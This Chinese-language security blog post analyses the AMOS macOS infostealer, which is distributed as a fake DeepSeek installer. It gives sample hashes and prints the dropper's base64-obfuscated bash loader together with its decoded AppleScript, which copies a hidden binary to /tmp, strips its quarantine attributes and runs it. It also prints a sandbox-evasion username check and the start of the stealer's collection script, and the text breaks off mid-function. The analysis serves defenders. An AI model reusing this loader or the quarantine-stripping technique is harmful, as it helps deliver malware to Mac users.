---
title: 警惕！AMOS伪装成DeepSeek窃取Mac用户数据
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247512094&idx=1&sn=55053f15ff1fce20bbcb1eda4b446140&chksm=e89d98c6dfea11d06e2f1a4589cebacb17711aa330062727c600234e7c713026c9b48b3d40a2&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2025-02-22
fetch_date: 2025-10-06T20:37:21.798989
---

# 警惕！AMOS伪装成DeepSeek窃取Mac用户数据

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwzianGk0D5Wwc2ViaHu9y4G1amIBl1YhTI8riaG6cIib4miagicqX3hI3TXpKuw/0?wx_fmt=jpeg)

# 警惕！AMOS伪装成DeepSeek窃取Mac用户数据

原创

megaparsec

ChaMd5安全团队

#

### 概述

AMOS，全称为Atomic macOS Stealer，于2023年4月首次被发现，它是一个针对macOS 的信息窃取程序，以“恶意软件即服务”（MaaS，Malware-as-a-Service）的形式运作。它是目前少数几个活跃的macOS信息窃取恶意软件家族之一，其具备完整的窃取能力，能够捕获管理员密码、钥匙串密码、敏感的系统信息以及来自 Chrome、Firefox 和其他应用程序的凭证和浏览器信息。

### 样本信息

样本来源于@MalwareHunterTeam(https://x.com/malwrhunterteam) ，该样本从伪造的DeepSeek页面下载，目前该页面 https[:]//deepseek.exploreio[.]net 已404。

| 样本名称 | DeepSeek\_v.8.40.dmg |
| --- | --- |
| MD5 | 5b049b18a1874083935bff3d8572f69c |
| SHA-1 | 2acd4a7ffb26deeff5adb22635564679500a9144 |
| SHA-256 | 58cf64e33543791869a0f08776bcfe515fd6da36942045bed0ae0c21305442a5 |
| 文件类型 | DMG |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziayyBxgIy82lB1mCB00OcEOWZ24bub3IWqOVeC71icF45FzfUCMzd2toQ/640?wx_fmt=png&from=appmsg)

### 样本分析

DMG文件是 macOS 系统中常见的一种磁盘映像文件格式，类似于Windows中的ISO文件。它通常用于打包和分发应用程序、安装程序或其他文件。DMG 文件在 macOS 中可以像磁盘一样挂载，打开后可以查看其内容，并且通常会包含一个应用程序或安装包。双击DMG文件，如下图所示，提示需要通过终端（Terminal）进行安装。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwzialNwW1PofLTMGJiceWgDUdiavCB8yB0fMDd6YnUcehuRa1J3A1kKNKkvw/640?wx_fmt=png&from=appmsg)

在macOS上双击DMG文件，自动解压并挂载，也可以使用终端命令 hdiutil attach /path/to//file.dmg ，之后进入挂载的目录并查看其内容。共有两个文件，一个名为DeepSeek，另一个是终端的替身（类似与快捷方式)。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2Nwzia1icX0mW8eDB37pSw5RTNTPHW82wOLeRZia0vniaaZzIXUl7AQ9iaouZTHw/640?wx_fmt=png&from=appmsg)

查看DeepSeek文件的类型，发现其属于**Bash 脚本**。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziaTfL0XN5k0EvJIyNATnZkgRb6ymHUjx7TnZicnF0kL02xtUlj7HjVQSw/640?wx_fmt=png&from=appmsg)

Bash脚本内容如下：

```
#!/bin/bash

wDwyQrpH='IyEvYmluL2Jhc2gKb3Nhc2NyaXB0IC1lICdvbiBydW4KICAgIHRyeQogICAgICAgIHNldCB2b2x1bWVMaXN0IHRvIGxpc3QgZGlza3MKICAgIGVuZCB0cnkKICAgIHNldCBzZXR1cFZvbHVtZSB0byAiIgogICAgdHJ5CiAgICAgIC'
IxOudLSd='AgcmVwZWF0IHdpdGggdm9sIGluIHZvbHVtZUxpc3QKICAgICAgICAgICAgaWYgdm9sIGNvbnRhaW5zICJEZWVwU2VlayIgdGhlbgogICAgICAgICAgICAgICAgc2V0IHNldHVwVm9sdW1lIHRvIHZvbAogICAgICAgICAgICAgICAgZXhpdCByZXBlYXQKICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgZW5kIHJlcGVhdAogICAgZW5kIHRyeQogIC'
SkkdUOuJ='AgaWYgc2V0dXBWb2x1bWUgaXMgIiIgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kIGlmCiAgICBzZXQgc2NyaXB0RGlyIHRvICIvVm9sdW1lcy8iICYgc2V0dXBWb2x1bWUgJiAiLyIKICAgIHNldCBleGVjdXRhYmxlTmFtZSB0byAiLkRlZXBTZWVrIgogICAgc2V0IGV4ZWN1dGFibGVQYXRoIHRvIHNjcmlwdERpciAmIGV4ZWN1dGFibGVOYW1lCiAgICBzZXQgdG1wRXhlY3V0YWJsZVBhdGggdG8gIi90bXAvIiAmIGV4ZWN1dGFibGVOYW1lCiAgICB0cnkKICAgICAgICBkbyBzaGVsbCBzY3JpcHQgInJtIC1mICIgJiBxdW90ZWQgZm9ybSBvZiB0bXBFeGVjdXRhYmxlUGF0aAogICAgZW5kIHRyeQogICAgdHJ5CiAgICAgICAgZG8gc2hlbGwgc2NyaXB0ICJjcCAiICYgcXVvdGVkIGZvcm0gb2YgZXhlY3V0YWJsZVBhdGggJiAiICIgJiBxdW90ZWQgZm9ybSBvZiB0bXBFeGVjdXRhYmxlUGF0aAogICAgZW5kIHRyeQogICAgdHJ5CiAgICAgICAgZG8gc2hlbGwgc2NyaXB0ICJ4YXR0ciAtYyAiICYgcXVvdGVkIGZvcm0gb2YgdG1wRXhlY3V0YWJsZVBhdGgKICAgIGVuZCB0cnkKICAgIHRyeQogICAgICAgIGRvIHNoZWxsIHNjcmlwdCAiY2htb2QgK3ggIiAmIHF1b3RlZCBmb3JtIG9mIHRtcEV4ZWN1dGFibGVQYXRoCiAgICBlbmQgdHJ5CiAgICB0cnkKICAgICAgICBkbyBzaGVsbCBzY3JpcHQgcXVvdGVkIGZvcm0gb2YgdG1wRXhlY3V0YWJsZVBhdGgKICAgIGVuZCB0cnkKZW5kIHJ1bic='
funcname="${wDwyQrpH}${IxOudLSd}${SkkdUOuJ}"

bash -c "$(echo "$funcname" | base64 --decode)"
```

wDwyQrpH、IxOudLSd 和 SkkdUOuJ 是 Base64 编码的字符串，解码后将构成一个可执行的 Bash 脚本。解码后的脚本内容如下所示，该脚本会检索一个名为 "DeepSeek" 的磁盘卷，并从中提取一个名为 .DeepSeek 的可执行文件；然后它将该文件复制到 /tmp/ 目录，去除其扩展属性，赋予执行权限，最后执行该文件。去除**扩展属性**(Extended attributes，EA）通常是为了删除 macOS 的安全标记（例如来自互联网下载的文件的标记），避免在执行时出现警告。关于去除扩展属性的具体内容，详见macOS Extended Attributes: Case Study(https://dfir.ch/posts/macos\_extended\_attributes/)

```
#!/bin/bash
osascript -e 'on run
    try
        set volumeList to list disks
    end try
    set setupVolume to ""
    try
        repeat with vol in volumeList
            if vol contains "DeepSeek" then
                set setupVolume to vol
                exit repeat
            end if
        end repeat
    end try
    if setupVolume is "" then
        return
    end if
    set scriptDir to "/Volumes/" & setupVolume & "/"
    set executableName to ".DeepSeek"
    set executablePath to scriptDir & executableName
    set tmpExecutablePath to "/tmp/" & executableName
    try
        do shell script "rm -f " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "cp " & quoted form of executablePath & " " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "xattr -c " & quoted form of tmpExecutablePath
    end try
    try
        do shell script "chmod +x " & quoted form of tmpExecutablePath
    end try
    try
        do shell script quoted form of tmpExecutablePath
    end try
end run'
```

使用7-Zip即可查看DMG文件中的内容;在DMG文件中注意到两个文件.DeepSeek**和**DeepSeek.file，DeepSeek.file文件即为前面分析的Bash 脚本。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziaVJQqnfian80GvC0sak6tpAwM7XP12A3g8dGb1UiasicFU2AQM0oricECAw/640?wx_fmt=png&from=appmsg)

.DeepSeek为Mach-O格式文件，Mach-O（Mach Object File Format）是 macOS 上的可执行文件格式，类似于 Linux 和大部分 UNIX 的原生格式 ELF（Extensible Firmware Interface）。Mach-O 文件可以包含多种架构的二进制代码（如，x86\_64、arm64），可以让同一个应用程序支持不同的硬件架构。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziaTrbIxO8wWGJ7Ne044OQVSDskOZuzYKVfWb6YxILVrj6tjBa7U1LH6Q/640?wx_fmt=png&from=appmsg)

IDA打开后，看到大量的16进制形式的字符串，AMOS对其字符串进行了加密。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziayAcSHAv3km0dafnuxg2Ju7hT4STzibapqAp8ia2GJf3dtEicVvUKEkCOg/640?wx_fmt=png&from=appmsg)

之后有一个无限循环，内部通过 switch 语句判断不同的 case，在每个 case 中根据条件操作变量，并跳转到LABEL\_3。LABEL\_3中，调用std::string::append进行字符串追加，直至满足条件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziaDR6zrbIheMnv3bcgb7qRPiaAPkuLdPNBHJJ3tMK1nts5pHsgsvdlv1A/640?wx_fmt=png&from=appmsg)

定位到case 292，后续执行了三次调用了system()函数，该函数用于执行外部命令或程序。那么，如果在执行system()函数执行前必然要解密相关内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziadbewJjzxCC1UQQiaO9mp1EFAicHB2tUdRbbW1HBm2HTI7kl3o2w7p39g/640?wx_fmt=png&from=appmsg)

可以通过LLDB或者IDA下断点调试，获取解密的字符串，也可以选用沙箱。在沙箱报告天穹动态分析沙箱分析报告(https://sandbox.qianxin.com/tq/report/toViewReport.do?rid=3d88fc33fe22395d5a57bcf7ea72843b&sk=59062323)中发现了执行的 **AppleScript 脚本**，如下图所示。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2Nwzia2ZS6cT0AFyE6YGib785m9YDHiby4ZnQxmvt6nnibgsXLbhCibS2OWtTP7g/640?wx_fmt=png&from=appmsg)

下面的脚本用于检查当前 当前用户的用户名是否为 "maria"、"run"、"jackiemac" 或 "bruno" 之一。如果是其中之一，则触发错误并退出，返回非零状态码。检查用户名的目的是为了规避沙箱分析。

```
osascript -e '
if (short user name of (system info)) is "maria" or
   (short user name of (system info)) is "run" or
   (short user name of (system info)) is "jackiemac" or
   (short user name of (system info)) is "bruno" then
    error number -1
end if
'
```

接着执行`disown; pkill Terminal`，即关闭终端窗口，但保持当前后台进程运行，然后执行下图的脚本。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTfwaJd2GQaBdjfEWv2NwziaoXBxP8llowlMaacBzicUdFhEGGLtNPcLrp9Egwkgib4bNV8ByicfyIGpg/640?wx_fmt=png&from=appmsg)

这个AppleScript 脚本经DeepSeek格式化并添加适当注释后的内容如下：

```
(*
恶意软件检测警告：
此脚本包含数据收集和远程传输功能，可能涉及用户隐私安全。
建议在安全环境中谨慎分析，请勿直接运行未知来源脚本。
*)

-- 隐藏终端窗口
osascript -e 'tell application "Terminal" to set visible of the front window to false'

-- 文件大小获取处理器
on filesizer(paths)
    set fsz to 0
    try
        set theItem to quoted form of POSIX path of paths
        set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
    end try
    return fsz
end filesizer

-- 目录创建处理器
on mkdir(someItem)
    try
        set filePosixPath to quoted form of (POSIX path of someItem)
        do shell script "mkdir -p " & filePosixPath
    end try
end mkdir

-- 文件名提取处理器
on FileName(filePath)
    try
        set reversedPath to (reverse of every character of filePath) as string
        set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
        set finalPath to (reverse of every character of trimmedPath) as string
        return final...